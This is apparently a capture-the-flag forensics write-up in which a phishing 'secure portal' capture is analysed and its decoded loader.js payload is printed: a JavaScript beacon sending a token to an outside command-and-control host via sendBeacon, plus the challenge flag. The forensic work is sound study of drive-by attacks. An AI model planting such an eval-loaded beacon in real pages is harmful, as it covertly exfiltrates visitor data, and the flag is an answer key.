# 302 · web-wormhole

> **Category:** Network / Forensics · **Points:** 150 · **Track:** [Foundation One](README.md)

## Challenge

The link in the phishing email didn't open a document. It opened a "secure portal" that quietly loaded more than a page. A corporate capture (`drive_by.pcap`) holds the whole visit: ordinary page furniture, and *"one thing that does not belong"*, folded up so that a skim of the source misses it.

## Approach

TCP streams were reassembled with Scapy, HTTP responses were parsed (handling pipelining, gzip and chunked transfer-encoding), and every object served by `portal.asimov-aerospace-partners.com` was decompressed. The page loads a stylesheet, a logo and three scripts:

| Script | Decoded role | Verdict |
|---|---|---|
| `analytics.js` | Harmless telemetry config | Benign |
| `viewer.js` | Injects an `<iframe>` pointing at a (non-existent) NDA PDF | Benign |
| `loader.js` | Base64 payload, `eval(atob(...))` style | **Malicious** |

Base64-decoding the payload of `loader.js` unfolds the real logic:

```javascript
// staged beacon payload -- do not log
var cfg = { c2: 'cdn-sat-sync.net', id: 'FOUNDATION' };
var token = "GAIANSPACE{dr1ve_by_st4ged}";
navigator.sendBeacon('https://' + cfg.c2 + '/b', token);
```

This is the exfiltration beacon the portal silently planted in the visitor's browser.

## Flag

```
GAIANSPACE{dr1ve_by_st4ged}
```

---
[← Back to index](../../README.md)
